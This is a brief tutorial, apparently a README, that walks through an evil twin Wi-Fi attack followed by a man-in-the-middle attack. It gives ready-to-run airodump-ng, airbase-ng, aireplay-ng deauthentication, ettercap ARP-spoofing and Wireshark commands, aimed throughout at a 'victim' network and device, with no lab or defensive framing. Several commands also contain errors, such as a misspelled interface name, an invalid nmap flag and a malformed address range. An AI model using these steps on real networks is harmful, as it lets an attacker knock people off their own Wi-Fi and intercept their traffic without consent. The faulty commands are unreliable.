## IN THIS TUTORIAL YOU WILL LEARN HOW TO CREATE A EVIL TWIN ATTACK AND PERFORM MITM ATTACK.


### TERMINAL 1 :

Step 1 :->  service apache2 start

Step 2 :->  ifconfig wlan1 down (or the network adapter you are using)

Step 3 :->  iwconfig wla1 mode monitor

Step 4 :->  ifconfig wlan1 up

Step 5 :->  airodump-ng wlan1

Step 6 :->  ctrl + c 

Step 7 :->  airodump-ng --bssid 00:00:00:00:00:00 -c 0 wlan1 [bssid = vicitims network bssid  -c 0 = channel on which the victim network 
is on]

Step 8 :->  now copy the station id of the victims device (mac address)


### TERMINAL 2 :  TO CREATE A FAKE WIFI 

Step 1 :->  sudo airbase-ng -e "wifiname" -a 00:00:00:00:00:00 -c 0 wlan1   ["wifiname" = victims wifi name which we are copying and 
creating a fake wifi]




### TERMINAL 3 :  to remove the victim from his own wifi and force him to join our fake wifi



Step 1 :->  sudo aireplay-ng --deauth 0 -a 00:00:00:00:00:00 -c 00:00:00:00:00:00 wlan1   [-a bssid = victims wifi, -c bssid = vicitims device mac address]




# ONCE WE HAVE THE VICTIM ON THE FAKE NETWORK THEN WE CAN PERFORM MAN IN THE MIDDLE ATTACK.

STEP 1 :->  sudo nmap -Sn 192.168.01/24 (192.168.0.1 = ROUTER'S IP)

STEP 2 :->  sudo ettercap -T -S -i wlan0 -M arp:remote /192.168.0.1// /192.168.0.0//   [192.168.0.1=router's ip, 192.168.0.0=victim's ip]



### NEW TERMINAL 



STEP 1 :->  sudo wireshark   [you can see all the traffic between the router and the victim]
 
